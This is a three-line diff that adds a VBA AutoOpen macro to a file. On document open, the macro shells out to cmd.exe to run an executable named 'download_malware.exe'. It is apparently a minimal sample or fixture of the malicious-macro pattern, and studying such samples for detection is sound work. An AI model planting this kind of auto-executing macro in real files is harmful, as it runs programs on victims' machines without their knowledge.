@@ -1,0 +1,3 @@
+Sub AutoOpen()
+ Shell("cmd.exe /c download_malware.exe")
+End Sub
